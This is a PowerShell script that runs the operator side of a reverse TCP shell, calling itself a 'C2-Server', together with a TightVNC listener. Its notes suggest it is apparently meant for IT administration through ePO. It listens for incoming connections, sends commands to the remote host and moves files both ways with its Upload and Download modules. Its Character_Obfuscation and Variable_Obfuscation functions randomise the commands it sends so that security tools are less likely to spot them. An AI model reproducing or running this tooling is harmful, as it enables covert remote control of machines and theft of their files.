<# 
.SYNOPSIS
   Start this script to run the reverseshell resever or VNC client

.DESCRIPTION 
    ..
 
.NOTES 
    Make sure that "tvnviewer.exe" is in the same folder as this script

    like to have. 
        Log: send all logs back to admin
        Runnow: send run now to host, ePO api


.LINK 
    Download VNC from https://www.tightvnc.com/
    Extract the ececuteboles for the package and the admin console side
  
.LINK
    code ustes for the reverse shell https://github.com/ZHacker13/ReverseTCPShell
#>
[int]$Local_Console_Port = 1616
[int]$Local_VNC_Port = 5900

function start-vnc-client{
    Write-Host " - Starting VNC client"
    Start-Process -FilePath tvnviewer.exe -ArgumentList "-listen"
    Start-Sleep -Seconds 1
    if((Get-Process -Name tvnviewer -ErrorAction SilentlyContinue).count -gt 0){
        Write-Host " - VNC client is listening for client to connect." -ForegroundColor DarkGreen
    } else {
        Write-Host " - VNC client is not running." -ForegroundColor DarkRed
    }
}

function stop-vnc-client{
    Write-Host " - stopping VNC client."
    Stop-Process -Name tvnviewer -Force
    Start-Sleep -Seconds 1
    if((Get-Process -Name tvnviewer -ErrorAction SilentlyContinue).count -gt 0){
        Write-Host " - VNC client is not stopping." -ForegroundColor DarkRed
    } else {
        Write-Host " - VNC client is stopt." -ForegroundColor DarkGreen
    }
}

function Get-IPAddress {
    return Get-NetIPAddress | Select-Object IPAddress | Where-Object IPAddress -NotIn "::1","127.0.0.1"
}

function Check_free_Ports {
    netstat -na | Select-String LISTENING | % {
        If(($_.ToString().split(":")[1].split(" ")[0]) -eq "$Local_Console_Port")
        {
            Write-Host " - Console port in use. Please change port." -ForegroundColor DarkRed
            exit 1
        }
        If(($_.ToString().split(":")[1].split(" ")[0]) -eq "$Local_VNC_Port")
        {
            Write-Host " - Default VNC port in use."  -ForegroundColor DarkRed
            exit 1
        }
    }
    Write-Host " - Ports are free for you to use." -ForegroundColor DarkGreen
}

function Character_Obfuscation($String)
{
  $String = $String.toCharArray();
  
  Foreach($Letter in $String) 
  {
    $RandomNumber = (1..2) | Get-Random;
    
    If($RandomNumber -eq "1")
    {
      $Letter = "$Letter".ToLower();
    }

    If($RandomNumber -eq "2")
    {
      $Letter = "$Letter".ToUpper();
    }

    $RandomString += $Letter;
    $RandomNumber = $Null;
  }
  
  $String = $RandomString;
  Return $String;
}

function Variable_Obfuscation($String)
{
  $RandomVariable = (0..99);

  For($i = 0; $i -lt $RandomVariable.count; $i++)
  {
    $Temp = (-Join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}));

    While($RandomVariable -like "$Temp")
    {
      $Temp = (-Join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}));
    }

    $RandomVariable[$i] = $Temp;
    $Temp = $Null;
  }

  $RandomString = $String;

  For($x = $RandomVariable.count; $x -ge 1; $x--)
  {
  	$Temp = $RandomVariable[$x-1];
    $RandomString = "$RandomString" -replace "\`$$x", "`$$Temp";
  }

  $String = $RandomString;
  Return $String;
}

function Start-ReverseShell {
    $Modules = @"
                                                                                                        
- | Modules    | - Show C2-Server Modules.
- | Info       | - Show Remote-Host Info.
- | Upload     | - Upload File from Local-Host to Remote-Host.
- | Download   | - Download File from Remote-Host to Local-Host.
- | VNC        |

"@;
   
   $Bytes = [System.Byte[]]::CreateInstance([System.Byte],1024);
   Write-Host " - Listening on the following addresses"
   (Get-IPAddress | Format-Table -HideTableHeaders | Out-String).Trim()
   Write-Host " - Local Console Port: $Local_Console_Port";
   $Socket = New-Object System.Net.Sockets.TcpListener('0.0.0.0',$Local_Console_Port);
   $Socket.Start();
   $Client = $Socket.AcceptTcpClient();
   $Remote_Host = $Client.Client.RemoteEndPoint.Address.IPAddressToString;
   Write-Host " [*] Connection ! `"$Remote_Host`" [*]";
   Write-Host " [*] Please Wait ... [*]";
   $Stream = $Client.GetStream();
   
   $WaitData = $False;
   $Info = $Null;
   
   Write-Host $Modules;
   
   $System = Character_Obfuscation("(Get-WmiObject Win32_OperatingSystem).Caption");
   $Version = Character_Obfuscation("(Get-WmiObject Win32_OperatingSystem).Version");
   $Architecture = Character_Obfuscation("(Get-WmiObject Win32_OperatingSystem).OSArchitecture");
   $Name = Character_Obfuscation("(Get-WmiObject Win32_OperatingSystem).CSName");
   $WindowsDirectory = Character_Obfuscation("(Get-WmiObject Win32_OperatingSystem).WindowsDirectory");
   
   $Command = "`" - Host: `"+`"$Remote_Host`"+`"``n - System: `"+$System+`"``n - Version: `"+$Version+`"``n - Architecture: `"+$Architecture+`"``n - Name: `"+$Name+`"``n - WindowsDirectory: `"+$WindowsDirectory";
   
   While($Client.Connected)
   {
     If(!($WaitData))
     {
       If(!($Command))
       {
         Write-Host " - Command: " -NoNewline;
         $Command = Read-Host;
       }
   
       If($Command -eq "Modules")
       {
         Write-Host "`n$Modules";
         $Command = $Null;
       }
   
       If($Command -eq "Info")
       {
         Write-Host "`n$Info";
         $Command = $Null;
       }
   
       If($Command -eq "Download")
       {
         Write-Host "`n - Download File: " -NoNewline;
         $File = Read-Host;
   
         If(!("$File" -like "* *") -and !([string]::IsNullOrEmpty($File)))
         {
           Write-Host "`n [*] Please Wait ... [*]";
           $Command = "`$1=`"#`";If(!(`"`$1`" -like `"*\*`") -and !(`"`$1`" -like `"*/*`")){`$1=`"`$pwd\`$1`"};If(([System.IO.File]::Exists(`"`$1`"))){[io.file]::ReadAllBytes(`"`$1`") -join ','}";
           $Command = Variable_Obfuscation(Character_Obfuscation($Command));
           $Command = $Command -replace "#","$File";
           $File = $File.Split('\')[-1];
           $File = $File.Split('/')[-1];
           $File = "$pwd\$File";
           $Save = $True;
         
         } Else {
   
           Write-Host "`n";
           $File = $Null;
           $Command = $Null;
         }
       }
   
       If($Command -eq "Upload")
       {
         Write-Host "`n - Upload File: " -NoNewline;
         $File = Read-Host;
   
         If(!("$File" -like "* *") -and !([string]::IsNullOrEmpty($File)))
         {
           Write-Host "`n [*] Please Wait ... [*]";
   
           If(!("$File" -like "*\*") -and !("$File" -like "*/*"))
           {
             $File = "$pwd\$File";
           }
   
           If(([System.IO.File]::Exists("$File")))
           {
             $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
             $FileBytes = "($FileBytes)";
             $File = $File.Split('\')[-1];
             $File = $File.Split('/')[-1];
             $Command = "`$1=`"`$pwd\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1 [*]`"}";
             $Command = Variable_Obfuscation(Character_Obfuscation($Command));
             $Command = $Command -replace "#","$File";
             $Command = $Command -replace "@","$FileBytes";
             $Upload = $True;
   
           } Else {
   
             Write-Host " [*] Failed ! [*]";
             Write-Host " [*] File Missing [*]`n";
             $Command = $Null;
           }
   
         } Else {
   
           Write-Host "`n";
           $Command = $Null;
         }
   
         $File = $Null;
       }
   
       If(!([string]::IsNullOrEmpty($Command)))
       {
         If(!($Command.length % $Bytes.count))
         {
           $Command += " ";
         }
   
         $SendByte = ([text.encoding]::ASCII).GetBytes($Command);
   
         Try {
   
           $Stream.Write($SendByte,0,$SendByte.length);
           $Stream.Flush();
         }
   
         Catch {
   
           Write-Host "`n [*] Connection Lost ! [*]`n";
           $Socket.Stop();
           $Client.Close();
           $Stream.Dispose();
           Exit;
         }
   
         $WaitData = $True;
       }
   
       If($Command -eq "Exit")
       {
         Write-Host "`n [*] Connection Lost ! [*]`n";
         $Socket.Stop();
         $Client.Close();
         $Stream.Dispose();
         Exit;
       }
   
       If($Command -eq "Clear" -or $Command -eq "Cls" -or $Command -eq "Clear-Host")
       {
         Clear-Host;
         Write-Host "`n$Modules";
       }
   
       $Command = $Null;
     }
   
     If($WaitData)
     {
       While(!($Stream.DataAvailable))
       {
         Start-Sleep -Milliseconds 1;
       }
   
       If($Stream.DataAvailable)
       {
         While($Stream.DataAvailable -or $Read -eq $Bytes.count)
         {
           Try {
   
             If(!($Stream.DataAvailable))
             {
               $Temp = 0;
   
               While(!($Stream.DataAvailable) -and $Temp -lt 1000)
               {
                 Start-Sleep -Milliseconds 1;
                 $Temp++;
               }
   
               If(!($Stream.DataAvailable))
               {
                 Write-Host "`n [*] Connection Lost ! [*]`n";
                 $Socket.Stop();
                 $Client.Close();
                 $Stream.Dispose();
                 Exit;
               }
             }
   
             $Read = $Stream.Read($Bytes,0,$Bytes.length);
             $OutPut += (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes,0,$Read);
           }
   
           Catch {
   
             Write-Host "`n [*] Connection Lost ! [*]`n";
             $Socket.Stop();
             $Client.Close();
             $Stream.Dispose();
             Exit;
           }
         }
   
         If(!($Info))
         {
           $Info = "$OutPut";
         }
   
         If($OutPut -ne " " -and !($Save) -and !($Upload))
         {
           Write-Host "`n$OutPut";
         }
   
         If($Save)
         {
           If($OutPut -ne " ")
           {
             If(!([System.IO.File]::Exists("$File")))
             {
               $FileBytes = IEX("($OutPut)");
               [System.IO.File]::WriteAllBytes("$File",$FileBytes);
               Write-Host " [*] Success ! [*]";
               Write-Host " [*] File Saved: $File [*]`n";
   
             } Else {
   
               Write-Host " [*] Failed ! [*]";
               Write-Host " [*] File already Exists [*]`n";
             }
           }   Else {
   
               Write-Host " [*] Failed ! [*]";
               Write-Host " [*] File Missing [*]`n";
           }
   
           $File = $Null;
           $Save = $False;
         }
   
         If($Upload)
         {
           If($OutPut -ne " ")
           {
             $OutPut = $OutPut -replace "`n","";
             Write-Host " [*] Success ! [*]";
             Write-Host " [*] File Uploaded: $OutPut`n";
   
           } Else {
             
             Write-Host " [*] Failed ! [*]";
             Write-Host " [*] File already Exists [*]`n";
           }
   
           $Upload = $False;
         }
   
       $WaitData = $False;
       $Read = $Null;
       $OutPut = $Null;
     }
    }
   } 
}

Clear-Host;

Check_free_Ports

Write-Host " - Use the folowing IP addresses in ePO"
(Get-IPAddress | Format-Table -HideTableHeaders | Out-String).Trim()

Write-Host "Do you like to start VNC?"
:loop while(-1){
    switch (Read-Host '(Y/N)'){
        Y { 
            start-vnc-client
            break loop
        }
        N {break loop}
        default { Write-Host 'Only Y/N valid' -fore red }
    }
}

Write-Host "Do you like to start Reverse shell?"
:loop while(-1){
    switch (Read-Host '(Y/N)'){
        Y { 
            Start-ReverseShell
            break loop
        }
        N {break loop}
        default { Write-Host 'Only Y/N valid' -fore red }
    }
}




